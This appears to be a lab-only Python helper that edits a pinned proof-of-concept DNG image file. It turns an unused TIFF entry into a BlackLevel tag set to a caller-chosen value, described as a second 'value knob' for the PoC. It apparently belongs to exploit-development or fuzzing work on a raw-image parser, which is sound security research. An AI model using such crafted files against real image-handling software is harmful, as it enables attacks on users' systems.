#!/usr/bin/env python3
"""Lab-only W10: add DNG BlackLevel (tag 0xc61a) as a second value knob.

The pinned MiniDNG PoC has an unused TIFF 0x00fe entry (LONG, count 1, value 0)
at IFD slot 2. This generator rewrites that slot as 0xc61a SHORT count 1 with
the requested BlackLevel, leaving the JPEG strip, CFA and WhiteLevel intact.
It works on a source already carrying 0xc61a by updating that entry instead.

usage: craft_blacklevel_poc.py SRC DST BLACKLEVEL
"""
import struct
import sys

src, dst = sys.argv[1:3]
bl = int(sys.argv[3])
assert 0 <= bl <= 65535
d = bytearray(open(src, "rb").read())
assert d[:2] == b"II"
ifd = struct.unpack_from("<I", d, 4)[0]
n = struct.unpack_from("<H", d, ifd)[0]
found = False
for i in range(n):
    e = ifd + 2 + 12 * i
    tag, typ, cnt = struct.unpack_from("<HHI", d, e)
    if tag == 0x00FE:
        assert typ == 4 and cnt == 1
        assert struct.unpack_from("<I", d, e + 8)[0] == 0
        struct.pack_into("<HHI", d, e, 0xC61A, 3, 1)
        struct.pack_into("<HH", d, e + 8, bl, 0)
        found = True
    elif tag == 0xC61A:
        assert typ == 3 and cnt == 1
        struct.pack_into("<H", d, e + 8, bl)
        found = True
assert found
open(dst, "wb").write(d)
print(f"wrote {dst} BlackLevel={bl}")
